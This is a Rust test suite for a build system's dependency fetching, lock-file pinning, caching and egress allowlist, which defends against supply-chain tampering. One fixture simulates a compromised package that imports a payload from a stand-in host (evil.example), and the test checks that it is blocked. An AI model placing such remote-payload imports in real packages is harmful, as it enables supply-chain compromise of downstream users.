//! Build-time fetching and pinning: `GuardedFetcher` + shared deps cache, `rt.lock`, and the
//! end-to-end build of remote dependencies served by `MockCdn`: BLD-04, BLD-05, BLD-06, BLD-16.
//!
//! The mock listens on `127.0.0.1`, which the production egress guard blocks by design (SEC-10),
//! so the fetcher is wired to `LoopbackEgress` (see `common/support.rs`): the same
//! `EgressGuard` seam, but it only lets the mock through and denies everything else.

use crate::common;

use std::collections::BTreeMap;

use common::*;
use rt_build::{BuildCx, Builder, FetchError, LockEntry, LockMismatch, ModuleFetcher, RtLock, Upload, LOCK_VERSION};
use rt_testkit::MockCdn;
use rt_types::{BuildFailReason, Digest, RuntimeKind};

fn zod_entry_bytes() -> Vec<u8> {
    std::fs::read(fixtures_root().join("deno/_cdn/zod_entry.mjs")).expect("zod_entry.mjs")
}

fn zod_impl_bytes() -> Vec<u8> {
    std::fs::read(fixtures_root().join("deno/_cdn/zod_impl.mjs")).expect("zod_impl.mjs")
}

/// A build context whose resolver sees the upload's own import map and whose fetcher goes through
/// the loopback shim to `cdn` only.
fn cx_for(
    builder: &rt_build::DefaultBuilder,
    upload: &Upload,
    cdn: &MockCdn,
    fetcher: std::sync::Arc<dyn ModuleFetcher>,
) -> BuildCx {
    let v = builder
        .validate(RuntimeKind::Deno, upload)
        .unwrap_or_else(|d| panic!("validation failed: {d:?}"));
    let mut cfg = mirror_resolver_cfg(cdn);
    cfg.import_map = v.import_map.clone();
    build_cx(MemArtifacts::new(), fetcher, cfg)
}

/// `path -> entry` view of a lock (keys are full URLs; the port differs per test run).
fn lock_by_path(lock: &RtLock) -> BTreeMap<String, LockEntry> {
    lock.entries
        .iter()
        .map(|(k, v)| (url(k).path().to_string(), v.clone()))
        .collect()
}

// ---------------------------------------------------------------------------------------------
// GuardedFetcher
// ---------------------------------------------------------------------------------------------

async fn started_cdn() -> (MockCdn, std::sync::Arc<LoopbackEgress>) {
    let cdn = MockCdn::start().await.expect("start MockCdn");
    let egress = LoopbackEgress::for_cdn(&cdn);
    (cdn, egress)
}

#[tokio::test]
async fn fetcher_fetches_hashes_and_reports_content_type() {
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let f = guarded_fetcher(egress, &["127.0.0.1"]);

    let got = f.fetch(&url(&cdn.url("/m.js")), None).await.expect("fetch");
    assert_eq!(got.bytes.as_ref(), b"export const a = 1;\n");
    assert_eq!(got.digest, Digest::of(b"export const a = 1;\n"));
    assert_eq!(got.url, url(&cdn.url("/m.js")));
    assert!(got.content_type.as_deref().unwrap_or("").contains("javascript"));
    assert!(!got.from_cache);
}

#[tokio::test]
async fn ac_bld_05_fetcher_serves_repeat_requests_from_the_deps_cache() {
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let f = guarded_fetcher(egress.clone(), &["127.0.0.1"]);
    let u = url(&cdn.url("/m.js"));

    let first = f.fetch(&u, None).await.expect("first fetch");
    assert!(!first.from_cache);
    assert_eq!(cdn.hits("/m.js"), 1);

    let second = f.fetch(&u, None).await.expect("second fetch");
    assert!(
        second.from_cache,
        "second fetch of the same URL must hit the shared cache"
    );
    assert_eq!(second.digest, first.digest);
    assert_eq!(cdn.hits("/m.js"), 1, "no new network request");
    assert_eq!(egress.requests(), 1);
}

#[tokio::test]
async fn fetcher_verifies_expected_digest_on_network_and_cache_paths() {
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let f = guarded_fetcher(egress, &["127.0.0.1"]);
    let u = url(&cdn.url("/m.js"));
    let good = Digest::of(b"export const a = 1;\n");
    let bad = Digest::of(b"something else");

    f.fetch(&u, Some(good)).await.expect("matching digest");
    match f.fetch(&u, Some(bad)).await {
        Err(FetchError::DigestMismatch {
            url: got_url,
            expected,
            actual,
        }) => {
            assert!(got_url.contains("/m.js"));
            assert_eq!(expected, bad);
            assert_eq!(actual, good);
        }
        other => panic!("expected DigestMismatch (cache hit must not bypass the lock), got {other:?}"),
    }

    // Fresh fetcher = network path.
    let (cdn2, egress2) = started_cdn().await;
    cdn2.set_js("/m.js", "export const a = 1;\n");
    let f2 = guarded_fetcher(egress2, &["127.0.0.1"]);
    assert!(matches!(
        f2.fetch(&url(&cdn2.url("/m.js")), Some(bad)).await,
        Err(FetchError::DigestMismatch { .. })
    ));
}

#[tokio::test]
async fn fetcher_missing_module_is_not_found() {
    let (cdn, egress) = started_cdn().await;
    let f = guarded_fetcher(egress, &["127.0.0.1"]);
    assert!(matches!(
        f.fetch(&url(&cdn.url("/nope.js")), None).await,
        Err(FetchError::NotFound(_))
    ));
}

#[tokio::test]
async fn fetcher_denies_hosts_outside_build_allowed_hosts() {
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let f = guarded_fetcher(egress.clone(), &["esm.sh"]);

    let r = f.fetch(&url(&cdn.url("/m.js")), None).await;
    assert!(matches!(r, Err(FetchError::Denied(_))), "got {r:?}");
    assert_eq!(cdn.hits("/m.js"), 0, "a denied fetch must not reach the server");
    assert!(egress.sent_urls().is_empty());
}

#[tokio::test]
async fn fetcher_enforces_the_per_module_size_cap() {
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/big.js", &format!("export const s = \"{}\";\n", "x".repeat(4096)));
    let mut cfg = fetcher_cfg(&["127.0.0.1"]);
    cfg.max_module_bytes = 1024;
    let f = rt_build::GuardedFetcher::new(egress, cfg);
    assert!(matches!(
        f.fetch(&url(&cdn.url("/big.js")), None).await,
        Err(FetchError::TooLarge)
    ));
}

// ---------------------------------------------------------------------------------------------
// RtLock
// ---------------------------------------------------------------------------------------------

#[test]
fn lock_records_verifies_and_digests_deterministically() {
    let a = Digest::of(b"a");
    let b = Digest::of(b"b");

    let mut l1 = RtLock::default();
    assert_eq!(l1.version, LOCK_VERSION);
    l1.record("https://esm.sh/a.js", a, 1);
    l1.record("https://esm.sh/b.js", b, 1);

    // Insertion order must not matter: the lock digest is `versions.lock_digest`.
    let mut l2 = RtLock::default();
    l2.record("https://esm.sh/b.js", b, 1);
    l2.record("https://esm.sh/a.js", a, 1);
    assert_eq!(l1, l2);
    assert_eq!(l1.digest(), l2.digest());
    assert_eq!(l1.to_bytes(), l2.to_bytes());

    // Round trip.
    assert_eq!(RtLock::from_bytes(&l1.to_bytes()).expect("parse"), l1);

    // Any change moves the digest.
    let mut l3 = l1.clone();
    l3.record("https://esm.sh/a.js", Digest::of(b"changed"), 7);
    assert_ne!(l1.digest(), l3.digest());

    // verify: matching passes, unknown URL passes (it will be recorded), changed bytes fail.
    l1.verify("https://esm.sh/a.js", &a).expect("same digest");
    l1.verify("https://esm.sh/new.js", &Digest::of(b"x"))
        .expect("unlocked URL");
    let err: LockMismatch = l1.verify("https://esm.sh/a.js", &b).expect_err("changed");
    assert_eq!(err.url, "https://esm.sh/a.js");
    assert_eq!(err.expected, a);
    assert_eq!(err.actual, b);
    assert!(err.to_string().contains("https://esm.sh/a.js"));
}

// ---------------------------------------------------------------------------------------------
// BLD-04
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn ac_bld_04_npm_import_is_fetched_bundled_and_pinned_in_rt_lock() {
    let cdn = cdn_with_zod().await;
    let egress = LoopbackEgress::for_cdn(&cdn);
    let fetcher = guarded_fetcher(egress.clone(), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = fixture_upload("npm_zod");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let art = build_deno(&builder, &mut cx, &upload)
        .await
        .expect("build with npm:zod@3");

    // rt.lock lists every fetched URL (the entry and its transitive import) with its hash.
    let lock = art.lock.clone().expect("deno builds produce an rt.lock");
    assert_eq!(lock.version, LOCK_VERSION);
    let by_path = lock_by_path(&lock);
    assert_eq!(by_path.len(), 2, "exactly the two fetched modules: {by_path:?}");
    let entry = by_path.get(ZOD_ENTRY_PATH).expect("npm:zod@3 entry in rt.lock");
    let imp = by_path.get(ZOD_IMPL_PATH).expect("transitive module in rt.lock");
    assert_eq!(entry.digest, Digest::of(&zod_entry_bytes()));
    assert_eq!(entry.size, zod_entry_bytes().len() as u64);
    assert_eq!(imp.digest, Digest::of(&zod_impl_bytes()));
    assert_eq!(imp.size, zod_impl_bytes().len() as u64);

    // The npm: specifier was resolved against `build.npm_cdn` with target=es2022.
    assert!(
        egress
            .sent_urls()
            .iter()
            .any(|u| u.starts_with(&cdn.url("/zod@3")) && u.contains("target=es2022")),
        "sent: {:?}",
        egress.sent_urls()
    );
    assert_eq!(cdn.hits(ZOD_ENTRY_PATH), 1);
    assert_eq!(cdn.hits(ZOD_IMPL_PATH), 1);

    // The fetched code is inside the bundle (nothing is fetched at run time) and the bundle header
    // pins the lock.
    let bundle = bundle_of(&art);
    assert!(
        bundle.modules.iter().any(|m| m.source.contains("function prim")),
        "zod implementation bundled"
    );
    assert_eq!(bundle.lock_digest, Some(lock.digest()));
}

#[tokio::test]
async fn bld_04_import_map_to_npm_behaves_the_same() {
    let cdn = cdn_with_zod().await;
    let fetcher = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = fixture_upload("npm_zod_map");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let art = build_deno(&builder, &mut cx, &upload)
        .await
        .expect("build with mapped zod");
    let by_path = lock_by_path(&art.lock.expect("lock"));
    assert!(
        by_path.contains_key(ZOD_ENTRY_PATH) && by_path.contains_key(ZOD_IMPL_PATH),
        "{by_path:?}"
    );
}

/// In production the node-wide `DefaultResolver` is created once, without any import map: the
/// build itself must apply the upload's `rt.json` / bundle `imports` (E2E 22: `zod` -> `npm:zod@3`).
#[tokio::test]
async fn bld_04_import_map_applies_even_when_the_node_resolver_has_none() {
    let cdn = cdn_with_zod().await;
    let fetcher = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = fixture_upload("npm_zod_map");
    let mut cfg = mirror_resolver_cfg(&cdn);
    cfg.import_map = BTreeMap::new();
    let mut cx = build_cx(MemArtifacts::new(), fetcher, cfg);

    let art = build_deno(&builder, &mut cx, &upload)
        .await
        .expect("build with mapped zod");
    let by_path = lock_by_path(&art.lock.expect("lock"));
    assert!(
        by_path.contains_key(ZOD_ENTRY_PATH) && by_path.contains_key(ZOD_IMPL_PATH),
        "{by_path:?}"
    );
}

#[tokio::test]
async fn bld_04_jsr_import_resolves_under_the_cdn_jsr_prefix() {
    let cdn = MockCdn::start().await.expect("cdn");
    cdn.set_js(
        "/jsr/@std/path@1",
        "export function join(a, b) { return a + '/' + b; }\n",
    );
    let fetcher = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let builder = default_builder();
    let upload =
        ts_upload("import { join } from \"jsr:@std/path@1\";\nexport default () => new Response(join('a', 'b'));\n");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let art = build_deno(&builder, &mut cx, &upload).await.expect("jsr build");
    assert_eq!(cdn.hits("/jsr/@std/path@1"), 1);
    assert!(lock_by_path(&art.lock.expect("lock")).contains_key("/jsr/@std/path@1"));
}

// ---------------------------------------------------------------------------------------------
// BLD-05
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn ac_bld_05_second_service_with_same_dependency_makes_no_network_fetch() {
    let cdn = cdn_with_zod().await;
    let egress = LoopbackEgress::for_cdn(&cdn);
    let fetcher = guarded_fetcher(egress.clone(), &["127.0.0.1"]); // shared deps cache across services
    let builder = default_builder();

    let service_a = fixture_upload("npm_zod");
    let mut cx_a = cx_for(&builder, &service_a, &cdn, fetcher.clone());
    let art_a = build_deno(&builder, &mut cx_a, &service_a).await.expect("service A");
    let hits_after_a = (cdn.hits(ZOD_ENTRY_PATH), cdn.hits(ZOD_IMPL_PATH), cdn.total_hits());
    let requests_after_a = egress.requests();
    assert_eq!(hits_after_a, (1, 1, 2));

    // Service B: different source, same dependency.
    let service_b = fixture_upload("npm_zod_map");
    let mut cx_b = cx_for(&builder, &service_b, &cdn, fetcher.clone());
    let art_b = build_deno(&builder, &mut cx_b, &service_b).await.expect("service B");

    assert_eq!(cdn.total_hits(), 2, "dependency cache hit: the CDN saw no new request");
    assert_eq!(
        egress.requests(),
        requests_after_a,
        "nothing even reached the egress guard"
    );
    // The lock of B still records the (cached) modules with the same hashes.
    assert_eq!(
        lock_by_path(&art_b.lock.expect("lock B")),
        lock_by_path(&art_a.lock.expect("lock A"))
    );
}

// ---------------------------------------------------------------------------------------------
// BLD-06
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn ac_bld_06_changed_locked_url_fails_rebuild_with_lock_mismatch() {
    let cdn = cdn_with_zod().await;
    let builder = default_builder();
    let upload = fixture_upload("npm_zod");

    // First build pins the lock.
    let fetcher1 = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let mut cx1 = cx_for(&builder, &upload, &cdn, fetcher1);
    let first = build_deno(&builder, &mut cx1, &upload).await.expect("first build");
    let lock = first.lock.clone().expect("lock");

    // The CDN now serves different bytes at a locked URL; T2 is gone and every cache is cleared
    // (fresh fetcher), so the rebuild really fetches.
    cdn.set_js(ZOD_IMPL_PATH, "export const z = 'tampered upstream';\n");
    let fetcher2 = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let mut cx2 = cx_for(&builder, &upload, &cdn, fetcher2);
    let failure = validate_and_build(
        &builder,
        &mut cx2,
        &upload,
        RuntimeKind::Deno,
        Some(lock.clone()),
        std::time::Duration::from_secs(60),
    )
    .await
    .expect_err("rebuild against a changed locked module must fail");

    assert_eq!(failure.reason, BuildFailReason::LockMismatch);
    assert!(
        failure.message.contains("zod"),
        "message should name the module: {}",
        failure.message
    );

    // A fresh *first* build (no lock) just pins the new content: the lock is what protects.
    let fetcher3 = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let mut cx3 = cx_for(&builder, &upload, &cdn, fetcher3);
    let repinned = build_deno(&builder, &mut cx3, &upload)
        .await
        .expect("unlocked build succeeds");
    assert_ne!(
        lock_by_path(&repinned.lock.expect("lock"))[ZOD_IMPL_PATH].digest,
        lock_by_path(&lock)[ZOD_IMPL_PATH].digest
    );
}

#[tokio::test]
async fn bld_06_unchanged_content_rebuilds_cleanly_from_the_lock() {
    let cdn = cdn_with_zod().await;
    let builder = default_builder();
    let upload = fixture_upload("npm_zod");

    let mut cx1 = cx_for(
        &builder,
        &upload,
        &cdn,
        guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]),
    );
    let first = build_deno(&builder, &mut cx1, &upload).await.expect("first");

    let mut cx2 = cx_for(
        &builder,
        &upload,
        &cdn,
        guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]),
    );
    let second = validate_and_build(
        &builder,
        &mut cx2,
        &upload,
        RuntimeKind::Deno,
        first.lock.clone(),
        std::time::Duration::from_secs(60),
    )
    .await
    .expect("rebuild from lock");
    assert_eq!(second.lock, first.lock);
    assert_eq!(second.bundle_digest, first.bundle_digest);
}

// ---------------------------------------------------------------------------------------------
// BLD-16
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn ac_bld_16_local_npm_mirror_with_mirror_only_allowlist_and_no_internet() {
    let cdn = cdn_with_zod().await;
    let egress = LoopbackEgress::for_cdn(&cdn); // everything but the mirror is unreachable
    let fetcher = guarded_fetcher(egress.clone(), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = fixture_upload("npm_zod");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    build_deno(&builder, &mut cx, &upload)
        .await
        .expect("air-gapped build via the mirror");

    assert!(!egress.sent_urls().is_empty());
    for u in egress.sent_urls() {
        assert!(u.starts_with(&cdn.url("")), "request left the mirror: {u}");
    }
    assert!(
        egress.denied_urls().is_empty(),
        "nothing the build needed was denied: {:?}",
        egress.denied_urls()
    );
}

#[tokio::test]
async fn bld_16_other_hosts_stay_closed_when_only_the_mirror_is_allowed() {
    let cdn = cdn_with_zod().await;
    let egress = LoopbackEgress::for_cdn(&cdn);
    let fetcher = guarded_fetcher(egress.clone(), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = ts_upload("import \"https://esm.sh/some-lib@1/index.js\";\nexport default () => new Response('x');\n");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let failure = build_deno(&builder, &mut cx, &upload)
        .await
        .expect_err("esm.sh is not in allowed_hosts");
    assert_eq!(failure.reason, BuildFailReason::Resolve);
    assert!(!egress.sent_urls().iter().any(|u| u.contains("esm.sh")));
    assert_eq!(cdn.total_hits(), 0);
}

// ---------------------------------------------------------------------------------------------
// failure reasons of dependency handling
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn bld_missing_dependency_fails_with_fetch() {
    let cdn = MockCdn::start().await.expect("cdn"); // serves nothing
    let fetcher = guarded_fetcher(LoopbackEgress::for_cdn(&cdn), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = ts_upload("import \"npm:does-not-exist@1\";\nexport default () => new Response('x');\n");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let failure = build_deno(&builder, &mut cx, &upload)
        .await
        .expect_err("404 from the CDN");
    assert_eq!(failure.reason, BuildFailReason::Fetch);
}

#[tokio::test]
async fn bld_oversized_dependency_fails_with_too_large() {
    let cdn = MockCdn::start().await.expect("cdn");
    cdn.set_js("/huge@1", &format!("export const s = \"{}\";\n", "x".repeat(64 * 1024)));
    let egress = LoopbackEgress::for_cdn(&cdn);
    let mut fcfg = fetcher_cfg(&["127.0.0.1"]);
    fcfg.max_module_bytes = 16 * 1024;
    let fetcher = std::sync::Arc::new(rt_build::GuardedFetcher::new(egress, fcfg));
    let builder = default_builder();
    let upload = ts_upload("import \"npm:huge@1\";\nexport default () => new Response('x');\n");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let failure = build_deno(&builder, &mut cx, &upload)
        .await
        .expect_err("module over the cap");
    assert_eq!(failure.reason, BuildFailReason::TooLarge);
}

#[tokio::test]
async fn bld_compromised_dependency_cannot_pull_from_a_host_outside_the_allowlist() {
    let cdn = MockCdn::start().await.expect("cdn");
    cdn.set_js("/evil@1", "export * from \"https://evil.example/payload.js\";\n");
    let egress = LoopbackEgress::for_cdn(&cdn);
    let fetcher = guarded_fetcher(egress.clone(), &["127.0.0.1"]);
    let builder = default_builder();
    let upload = ts_upload("import \"npm:evil@1\";\nexport default () => new Response('x');\n");
    let mut cx = cx_for(&builder, &upload, &cdn, fetcher);

    let failure = build_deno(&builder, &mut cx, &upload)
        .await
        .expect_err("transitive import to a foreign host");
    assert_eq!(failure.reason, BuildFailReason::Resolve);
    assert!(!egress.sent_urls().iter().any(|u| u.contains("evil.example")));
}

#[tokio::test]
async fn a_deps_cache_hit_re_vendors_a_module_the_artifact_gc_removed() {
    use rt_store::ArtifactStore;
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let store = MemArtifacts::new();
    let f = rt_build::GuardedFetcher::new(egress, fetcher_cfg(&["127.0.0.1"])).with_vendor_store(store.clone());
    let u = url(&cdn.url("/m.js"));
    let first = f.fetch(&u, None).await.expect("fetch");
    assert!(
        store.exists(&first.digest).await.expect("exists"),
        "vendored on the network fetch"
    );

    // GC removed it while the module stayed in the in-memory deps cache.
    store.delete(&first.digest).await.expect("delete");
    let second = f.fetch(&u, None).await.expect("cache hit");
    assert!(second.from_cache);
    assert!(
        store.exists(&first.digest).await.expect("exists"),
        "the lock this build writes finds the module on disk again"
    );
    assert_eq!(cdn.hits("/m.js"), 1, "no new network request");
}

/// FETCH-003: a lock names a module by URL *and* digest. The vendor store (the node's artifact
/// store, which also holds every tenant's uploads) serves a locked digest only for a URL it was
/// vendored from; a lock that points an allow-listed URL at someone else's upload gets the URL's
/// real bytes and fails `lock_mismatch`, never the upload.
#[tokio::test]
async fn fetch_003_a_lock_cannot_read_an_unrelated_artifact_by_digest() {
    use rt_store::ArtifactStore;
    let (cdn, egress) = started_cdn().await;
    cdn.set_js("/m.js", "export const a = 1;\n");
    let store = MemArtifacts::new();
    // Another tenant's private upload, by its digest.
    let private = store
        .put(bytes::Bytes::from_static(b"export const secret = 'tenant-b';\n"))
        .await
        .expect("upload");
    let f = rt_build::GuardedFetcher::new(egress, fetcher_cfg(&["127.0.0.1"])).with_vendor_store(store.clone());
    let u = url(&cdn.url("/m.js"));
    let err = f
        .fetch(&u, Some(private))
        .await
        .expect_err("the URL does not serve that digest");
    assert!(matches!(err, rt_build::FetchError::DigestMismatch { .. }), "{err:?}");
    assert_eq!(cdn.hits("/m.js"), 1, "the URL itself was fetched");

    // A module vendored for this URL is still served from the store without the network.
    let other = rt_build::GuardedFetcher::new(LoopbackEgress::for_cdn(&cdn), fetcher_cfg(&["127.0.0.1"]))
        .with_vendor_store(store.clone());
    let first = other.fetch(&u, None).await.expect("fetch");
    let fresh = rt_build::GuardedFetcher::new(LoopbackEgress::for_cdn(&cdn), fetcher_cfg(&["127.0.0.1"]))
        .with_vendor_store(store.clone());
    let again = fresh.fetch(&u, Some(first.digest)).await.expect("vendored");
    assert!(again.from_cache);
    assert_eq!(cdn.hits("/m.js"), 2, "served from the vendor store");
}
